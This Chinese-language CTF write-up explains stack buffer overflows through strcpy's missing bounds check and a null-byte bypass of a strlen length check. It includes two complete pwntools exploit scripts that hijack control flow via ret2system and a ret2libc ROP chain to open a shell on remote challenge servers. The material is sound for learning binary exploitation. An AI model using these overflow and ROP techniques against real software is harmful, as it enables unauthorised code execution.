## strcpy,srtcmp,strlen函数漏洞利用

### strcpy

1. strcpy函数用于将字符串复制到另一个指针指向的空间中，遇到空字符 **b'x\00'**时停止，：

   ![image-20240531103615735](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405311037550.png)

2. 所以可以利用 **strcpy不检查缓冲区** 的漏洞（构造的字符串要以\0结尾），进行缓冲区溢出攻击:

   #### 例子：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#ciscn_2019_ne_5)

   1. main函数中提供了4个函数供使用：

      ![image-20240531104018597](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407051937648.png)

   2. 其中addlog函数进行输入，输入的长度位128个字符，调试观察他的栈上返回值（0x80488ec）在变量的上方，无法进行溢出，因此该函数只能作为输入：

      ![image-20240531104402495](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405311044581.png)

      ![image-20240531104108026](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405311041059.png)

   3. 后买你getflag函数中存在一个strcpy函数漏洞，可能可以进行栈溢出，动态调试观察其栈上的变化，可见只要 **字符串长度超过0x4c** 即可覆盖掉 **getflag函数的返回值** ，在出去时即可挟持函数的控制流：

      ![image-20240531105005891](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405311050968.png)

      ![image-20240531104533809](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405311045846.png)

   4. 利用addlog函数输入构造的payload，长度超过0x4c即可，先只需要system函数地址，和'bin/sh/'字符串的地址即可，system函数程序自带，查询一下字符串：

      ![image-20240531105324125](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405311053168.png)

   5. EXP：

      ``````python
      from pwn import *
      from LibcSearcher import *
      
      context(os='linux', arch='amd64', log_level='debug')
      
      p=remote("node5.buuoj.cn",28321)
      elf=ELF('./ciscn_2019_ne_5')
      
      p.recvuntil(b'Please input admin password:')
      payload = b'administrator'
      p.sendline(payload)
      p.recvuntil(b':')
      p.sendline(b'1')
      p.recv()
      
      #获取system地址
      sys_addr=elf.sym['system']
      sh_addr = 0x080482ea
      print(hex(sys_addr))
      
      #填充32位b'aaaa'，作为system的返回值（不需要使用到，所以随便填）
      payload = b'a'*(0x4c)+p32(sys_addr)+b'aaaa'+p32(sh_addr)+b'\x00'
      p.sendline(payload)
      p.recvuntil(b':')
      p.sendline(b'4')
      p.interactive()
      
      ``````

   
   
   
   ### strlen
   
   题目：[[LitCTF 2023\]狠狠的溢出涅~ | NSSCTF](https://www.nssctf.cn/problem/3877)
   
   1. ida查看，题目给了一个栈溢出漏洞，虽然给了0x200的长度，但是后面用户strlen检查了输入的长度不能超过0x50，溢出长度明显不够。
   
   2. 但是可以利用strlen函数判断字符串时以 **b'\x00'** 结尾，可以用b'\x00'绕过strlen的判断，EXP：
   
      ```python
      from pwn import *
      from LibcSearcher import *
      # 设置系统架构, 打印调试信息
      # arch 可选 : i386 / amd64 / arm / mips
      context(os='linux', arch='amd64', log_level='debug')
      p = remote("node4.anna.nssctf.cn",28314)
      # p = process("./pwn4")
      elf = ELF('./pwn4')
      #获取got、plt地址
      got = elf.got['puts']
      plt = elf.plt['puts']
      print(hex(got),hex(plt))
      
      #获取传参地址
      pop_rdi_ret = 0x00000000004007d3
      main_addr = 0x00000000004006B0
      ret = 0x0000000000400556
      
      p.recvuntil(b'Leave your message:\n')
      #构造payload，获得puts函数的地址
      payload = b'\x00'*(0x60+8)+p64(pop_rdi_ret)+p64(got)+p64(plt)+p64(main_addr)
      p.sendline(payload)
      addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
      print(hex(addr))
      
      # libc = LibcSearcher('puts',addr)
      # libc_base = addr - libc.dump('puts')
      # sys_addr = libc_base + libc.dump('system')
      # str_bin = libc_base + libc.dump('str_bin_sh')
      # print(hex(libc_base),hex(sys_addr),hex(str_bin))
      
      #查libc库的偏移
      libc_base = addr - 0x84420
      str_bin = libc_base + 		0x1b45bd
      sys_addr = libc_base + 		0x52290
      print(hex(libc_base),hex(sys_addr),hex(str_bin))
      
      #第二次利用栈溢出
      payload = b'\x00'*(0x60+8)+p64(ret)+p64(pop_rdi_ret)+p64(str_bin)+p64(sys_addr)
      p.sendline(payload)
      p.sendline(b'cat flag')
      # 与远程交互
      p.interactive()
      
      ```
   
      
   
   

